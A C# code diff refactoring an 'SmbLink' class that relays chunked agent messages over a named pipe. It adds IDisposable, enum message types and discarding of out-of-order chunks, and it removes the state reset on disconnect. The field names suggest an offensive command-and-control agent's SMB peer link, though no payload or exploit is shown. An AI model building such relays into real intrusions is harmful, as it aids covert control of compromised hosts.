@@ -8,7 +8,7 @@ using System.Text;
 
 namespace Workflow
 {
-    public class SmbLink
+    public class SmbLink : IDisposable
     {
         private PipeClient<SmbMessage> clientPipe { get; set; }
         public bool connected { get; set; }
@@ -23,6 +23,7 @@ namespace Workflow
             new ConcurrentDictionary<string, int>();
         IDataBroker messageManager { get; set; }
         ILogger logger { get; set; }
+        private bool disposed = false;
 
         private const int ConnectionTimeoutMs = 30000;
         private const int MessageAckTimeoutMs = 15000;
@@ -48,6 +49,11 @@ namespace Workflow
             {
                 if (this.clientPipe == null || !this.connected)
                 {
+                    if (this.clientPipe != null)
+                    {
+                        await this.clientPipe.DisposeAsync();
+                    }
+
                     this.clientPipe = new PipeClient<SmbMessage>(
                         args.pipename, args.hostname);
                     this.clientPipe.MessageReceived +=
@@ -132,7 +138,7 @@ namespace Workflow
 
                 switch (args.Message.message_type)
                 {
-                    case "success":
+                    case SmbMessageType.Success:
                         messageSuccess.Set();
                         break;
 
@@ -149,7 +155,13 @@ namespace Workflow
                             DebugLog.Log(
                                 $"SMB link chunk out of order for " +
                                 $"{guid}: expected {expected}, " +
-                                $"got {args.Message.sequence}");
+                                $"got {args.Message.sequence}. " +
+                                $"Discarding message.");
+                            this.partialMessages.TryRemove(
+                                guid, out _);
+                            this.expectedSequence.TryRemove(
+                                guid, out _);
+                            return;
                         }
 
                         this.expectedSequence[guid] = expected + 1;
@@ -192,10 +204,6 @@ namespace Workflow
                     await this.clientPipe.DisposeAsync();
                 }
 
-                this.connected = false;
-                this.partialMessages.Clear();
-                this.expectedSequence.Clear();
-
                 return true;
             }
             catch (Exception ex)
@@ -224,7 +232,7 @@ namespace Workflow
                     var sm = new SmbMessage
                     {
                         guid = messageGuid,
-                        message_type = "chunked_message",
+                        message_type = SmbMessageType.Chunked,
                         agent_guid = agent_id,
                         delegate_message = parts[i],
                         final = (i == parts.Count - 1),
@@ -251,6 +259,14 @@ namespace Workflow
                     $"{e.Message}");
                 return false;
             }
+        }
+
+        public void Dispose()
+        {
+            if (disposed) return;
+            disposed = true;
+
+            messageSuccess.Dispose();
         }
     }
 }
